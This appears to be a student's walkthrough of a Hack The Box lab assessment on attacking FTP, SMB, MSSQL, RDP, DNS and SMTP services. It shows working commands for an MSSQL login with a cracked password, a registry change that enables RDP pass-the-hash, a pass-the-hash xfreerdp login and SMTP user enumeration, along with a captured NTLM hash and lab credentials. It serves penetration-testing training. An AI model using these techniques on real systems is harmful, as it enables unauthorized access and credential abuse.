# ⚙ Attacking common services

## Assessment

### FTP

What username is available for the FTP server?

* I used the wordlist from ftp **anonymous** and get the username and password list.

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

### SMB

What is the name of the shared folder with READ permissions?

<figure><img src="../../.gitbook/assets/image (68) (1).png" alt=""><figcaption><p>GGJ</p></figcaption></figure>

What is the password for the username "jason"?

<figure><img src="../../.gitbook/assets/image (39) (1).png" alt=""><figcaption><p>MAKE SURE TO RUN WITH --local-auth</p></figcaption></figure>

Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

### SQL DB

What is the password for the "mssqlsvc" user?

<figure><img src="../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

`mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:5a04b004fa4e9d85f6186628bbb5f628:0101000000000000800f5b3cd1a9d9013832986d3a5b90e8000000000100100045006c0046004800450079006a0061000300100045006c0046004800450079006a006100020010006d007100780051006100480062004900040010006d00710078005100610048006200490007000800800f5b3cd1a9d90106000400020000000800300030000000000000000000000000300000205c323361b6fee9491d3dade42cd1a0ade509215af472deb6f497f224759ddc0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000`

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Enumerate the "flagDB" database and submit a flag as your answer.

```
impacket-mssqlclient 'mssqlsvc:princess1@10.129.203.12' -windows-auth
```

* Then explored the flagDB and got the hash.

### RDP

{% hint style="success" %}
RDP to target with username "`htb-rdp`" and password "`HTBRocks!`"
{% endhint %}

What is the name of the file that was left on the Desktop? (Format example: filename.txt)

* `pentest-notes.txt`

Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?

* `DisableRestrictedAdmin`

Connect via RDP with the Administrator account and submit the flag.txt as you answer.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption><p>Administrator:0E14B9D6330BF16C30B1924111104824</p></figcaption></figure>

1. `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
2. `xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /dynamic-resolution`
3. ![](<../../.gitbook/assets/image (8) (1).png>)

### DNS

Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

* used subbrute to enum the subdomain.
* found hr.inlanefreight.htb.
* performed dns zone transfer on hr.inalnefreight.htb.
* got the flag.

### EMAIL

What is the available username for the domain inlanefreight.htb in the SMTP server?

* ```shell-session
  smtp-user-enum -M RCPT -U ../users.list -D inlanefreight.htb -t 10.129.203.12
  ```

Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.

<figure><img src="../../.gitbook/assets/image (58) (1).png" alt=""><figcaption><p>marlin@inlanefreight.htb:poohbear</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

